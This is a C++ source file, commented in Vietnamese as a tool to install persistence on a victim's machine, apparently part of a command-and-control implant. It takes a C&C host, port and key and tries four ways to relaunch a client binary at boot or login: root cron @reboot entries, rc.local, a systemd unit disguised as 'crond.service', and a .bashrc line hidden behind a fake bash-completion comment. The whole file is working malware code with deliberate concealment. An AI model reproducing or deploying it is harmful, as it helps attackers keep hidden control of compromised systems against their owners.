// persistence.cpp — Tự cài persistence lên máy nạn nhân
// Usage: ./persistence <cnc_host> <cnc_port> <key_hex> [binary_path]

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <sys/stat.h>
#include <unistd.h>

static std::string get_self_path() {
    char buf[4096];
    ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (n > 0) { buf[n] = '\0'; return buf; }
    return "";
}

static bool try_cron(const std::string& cmd) {
    // Thử thêm cron job @reboot
    const char* cron_paths[] = {
        "/var/spool/cron/crontabs/root",
        "/var/spool/cron/root",
        "/etc/crontab",
        nullptr
    };
    for (int i = 0; cron_paths[i]; ++i) {
        if (access(cron_paths[i], W_OK) == 0) {
            FILE* f = fopen(cron_paths[i], "a");
            if (f) {
                std::fprintf(f, "@reboot %s\n", cmd.c_str());
                fclose(f);
                return true;
            }
        }
    }
    // Thử crontab -e
    std::string cron_cmd = "(crontab -l 2>/dev/null; echo '@reboot " + cmd + "') | crontab - 2>/dev/null";
    int ret = system(cron_cmd.c_str());
    return ret == 0;
}

static bool try_rclocal(const std::string& cmd) {
    if (access("/etc/rc.local", W_OK) != 0 && access("/etc/rc.d/rc.local", W_OK) != 0) return false;

    const char* path = access("/etc/rc.local", W_OK) == 0 ? "/etc/rc.local" : "/etc/rc.d/rc.local";
    FILE* f = fopen(path, "a");
    if (!f) return false;
    std::fprintf(f, "%s &\n", cmd.c_str());
    fclose(f);
    chmod(path, 0755);
    return true;
}

static bool try_systemd(const std::string& cmd) {
    if (access("/etc/systemd/system", W_OK) != 0) return false;

    std::string service_path = "/etc/systemd/system/crond.service";
    // Dùng tên giả dạng cron để ẩn
    FILE* f = fopen(service_path.c_str(), "w");
    if (!f) return false;
    std::fprintf(f,
        "[Unit]\n"
        "Description=Crond\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=forking\n"
        "ExecStart=%s\n"
        "Restart=always\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        cmd.c_str());
    fclose(f);

    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable crond.service 2>/dev/null");
    system("systemctl start crond.service 2>/dev/null");
    return true;
}

static bool try_bashrc(const std::string& cmd) {
    const char* home = getenv("HOME");
    if (!home) return false;
    std::string bashrc = std::string(home) + "/.bashrc";
    if (access(bashrc.c_str(), W_OK) != 0) return false;
    FILE* f = fopen(bashrc.c_str(), "a");
    if (!f) return false;
    std::fprintf(f, "\n# load bash completion\n%s &\n", cmd.c_str());
    fclose(f);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::fprintf(stdout, "{\"error\":\"Usage: %s <cnc_host> <cnc_port> <key_hex> [binary_path]\"}\n", argv[0]);
        return 1;
    }

    const char* host = argv[1];
    const char* port = argv[2];
    const char* key = argv[3];

    std::string bin_path = argc > 4 ? argv[4] : get_self_path();
    if (bin_path.empty()) bin_path = "/tmp/.client";

    std::string cmd = bin_path + " " + host + " " + port + " " + key;

    std::fprintf(stdout, "{\"methods\":{");

    bool cron_ok = try_cron(cmd);
    std::fprintf(stdout, "\"cron\":%s", cron_ok ? "true" : "false");

    bool rclocal_ok = try_rclocal(cmd);
    std::fprintf(stdout, ",\"rclocal\":%s", rclocal_ok ? "true" : "false");

    bool systemd_ok = try_systemd(cmd);
    std::fprintf(stdout, ",\"systemd\":%s", systemd_ok ? "true" : "false");

    bool bashrc_ok = try_bashrc(cmd);
    std::fprintf(stdout, ",\"bashrc\":%s", bashrc_ok ? "true" : "false");

    std::fprintf(stdout, "}}\n");

    return (cron_ok || rclocal_ok || systemd_ok || bashrc_ok) ? 0 : 1;
}
